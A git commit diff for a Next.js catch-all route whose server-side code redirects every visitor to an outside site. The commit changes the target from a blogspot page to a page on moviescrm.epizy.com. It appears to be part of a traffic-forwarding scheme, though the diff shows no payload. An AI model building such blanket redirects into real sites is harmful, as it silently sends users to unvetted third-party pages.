a4ef1ccee8311cbcbf0b64e4ebb1b41f50d3c8ae
githubwordpress1 <133713518+githubwordpress1@users.noreply.github.com>
2023-05-21 01:45:01 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://relaxingfacts.blogspot.com/search/label/Amazing%20Facts?&max-results=11/` + encodeURI(path as string)
+					`https://moviescrm.epizy.com/see-more//` + encodeURI(path as string)
 				}`,
 			},
 		};
